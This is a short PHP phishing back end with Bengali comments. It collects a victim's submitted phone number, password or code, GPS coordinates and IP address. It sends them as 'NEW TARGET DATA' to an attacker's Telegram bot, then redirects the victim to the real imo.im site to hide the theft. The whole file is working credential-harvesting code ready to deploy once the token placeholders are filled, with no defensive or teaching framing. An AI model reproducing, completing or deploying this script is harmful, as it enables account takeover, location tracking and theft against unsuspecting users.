<?php
// ১. আপনার তথ্য এখানে বসান
$botToken = "আপনার_বট_টোকেন_এখানে_দিন";
$chatID = "আপনার_চ্যাট_আইডি_এখানে_দিন";

// ২. ইউজার থেকে আসা ডাটা সংগ্রহ
$user = $_POST['username'];
$pass = $_POST['password'];
$lat = $_POST['lat'];
$lon = $_POST['lon'];
$ip = $_SERVER['REMOTE_ADDR'];

// ৩. লোকেশন ডাটা প্রসেস করা
$locationLink = "GPS Permission Denied";
if(!empty($lat) && !empty($lon)){
    $locationLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;
}

// ৪. টেলিগ্রামে পাঠানোর জন্য মেসেজ সাজানো
$message = "🔔 **NEW TARGET DATA** 🔔\n\n";
$message .= "📱 Phone: " . $user . "\n";
$message .= "🔑 Pass/Code: " . $pass . "\n";
$message .= "🌐 IP: " . $ip . "\n";
$message .= "📍 Location: " . $locationLink . "\n";

// ৫. টেলিগ্রাম এপিআই (API) কল করা
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatID . "&text=" . urlencode($message) . "&parse_mode=HTML";

// মেসেজ পাঠানো
file_get_contents($url);

// ৬. আসল সাইটে পাঠিয়ে দেওয়া
header("Location: https://imo.im/success");
exit();
?>
